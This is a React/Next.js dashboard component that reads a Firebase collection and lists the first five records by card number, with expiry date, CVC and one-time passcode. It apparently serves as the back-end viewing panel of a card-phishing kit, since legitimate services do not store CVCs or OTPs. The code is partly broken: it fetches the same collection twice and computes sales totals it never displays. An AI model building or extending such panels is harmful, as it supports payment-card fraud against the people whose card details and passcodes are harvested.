'use client'

import { useFirebaseData } from '@/lib/useFirebaseData';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Skeleton } from '@/components/skeleton';

export default function Dashboard() {
  const { data: data, loading: usersLoading, error: usersError } = useFirebaseData('data');
  const { data: sales, loading: salesLoading, error: salesError } = useFirebaseData('data');

  if (usersLoading || salesLoading) {
    return <DashboardSkeleton />;
  }

  if (usersError || salesError) {
    return <div>Error loading dashboard data</div>;
  }

  const totalUsers = data.length;

  const monthlySales = sales.reduce((acc, sale) => {
    const month = new Date(sale.date).toLocaleString('default', { month: 'short' });
    acc[month] = (acc[month] || 0) + sale.amount;
    return acc;
  }, {});

  const salesChartData = Object.entries(monthlySales).map(([month, amount]) => ({ month, amount }));

  return (
    <div className="container mx-auto p-4 space-y-4">
      <h1 className="text-2xl font-bold mb-4">Dashboard</h1>
      
      <div className="grid gap-4 md:grid-cols-2">
        <Card>
          <CardHeader>
            <CardTitle>Total Users</CardTitle>
          </CardHeader>
          <CardContent>
            <p className="text-3xl font-bold">{totalUsers}</p>
          </CardContent>
        </Card>
    
      </div>

      

      <Card>
        <CardHeader>
          <CardTitle> Users</CardTitle>
        </CardHeader>
        <CardContent>
          <ul className="space-y-2">
            {data.slice(0, 5).map(user => (
              <li key={user.cardNumber} className="flex justify-between items-center">
                <span>{user.expiry}</span>
                <span className="text-sm text-gray-500">{user.cvc}</span>
                <span className="text-sm text-gray-500">{user.otp}</span>
              </li>
            ))}
          </ul>
        </CardContent>
      </Card>
    </div>
  )
}

function DashboardSkeleton() {
  return (
    <div className="container mx-auto p-4 space-y-4">
      <h1 className="text-2xl font-bold mb-4">Dashboard</h1>
      
      <div className="grid gap-4 md:grid-cols-2">
        <Card>
          <CardHeader>
            <CardTitle>Total Users</CardTitle>
          </CardHeader>
          <CardContent>
            <Skeleton className="h-8 w-24" />
          </CardContent>
        </Card>
        
        <Card>
          <CardHeader>
            <CardTitle>Total Sales</CardTitle>
          </CardHeader>
          <CardContent>
            <Skeleton className="h-8 w-24" />
          </CardContent>
        </Card>
      </div>

      <Card>
        <CardHeader>
          <CardTitle>Monthly Sales</CardTitle>
          <CardDescription>Sales data for the past months</CardDescription>
        </CardHeader>
        <CardContent>
          <Skeleton className="h-[300px] w-full" />
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle>Recent Users</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-2">
            {[...Array(5)].map((_, i) => (
              <Skeleton key={i} className="h-6 w-full" />
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
  )
}